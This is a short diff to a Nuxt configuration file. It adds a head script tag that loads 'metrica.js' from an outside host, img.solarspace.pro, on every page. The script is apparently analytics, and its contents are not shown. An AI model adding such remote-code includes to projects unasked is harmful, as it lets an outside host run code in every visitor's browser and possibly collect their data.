@@ -44,5 +44,17 @@ export default defineNuxtConfig({
   css: ['~/assets/style.css'],
   vite: {
     plugins: [tailwindcss()]
+  },
+  app: {
+    head: {
+      script: [
+        {
+          src: 'https://img.solarspace.pro/docs/metrica.js',
+          async: true,
+          defer: true,
+          id: 'metrica'
+        }
+      ]
+    }
   }
 })
